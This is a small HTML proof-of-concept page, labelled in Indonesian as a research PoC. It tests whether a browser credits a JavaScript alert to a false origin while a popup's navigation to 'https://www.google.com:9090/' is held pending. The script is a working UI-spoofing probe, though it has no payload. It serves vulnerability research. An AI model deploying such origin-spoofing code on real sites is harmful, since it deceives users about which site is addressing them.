<meta charset="utf-8"><title>04 js-dialog origin line</title>
<h3>04 &mdash; baris atribusi dialog JS saat bar menggantung</h3>
<button onclick="run()">Run 04</button>
<pre id="p"></pre>
<script>
var T = 'https://www.google.com:9090/';
document.getElementById('p').textContent =
  'REAL origin : ' + location.origin + '\nREAL href   : ' + location.href;
function run(){
  var w = window.open('', '', 'width=480,height=620,left=200,top=120');
  w.document.write('<h3>Dokumen ini milik ' + location.origin + '</h3>');
  setInterval(function(){ w.location.replace(T); }, 9800);
  setTimeout(function(){ w.alert('PoC riset. Baca baris atribusi di atas kalimat ini: siapa yang disebut?'); }, 1200);
}
</script>
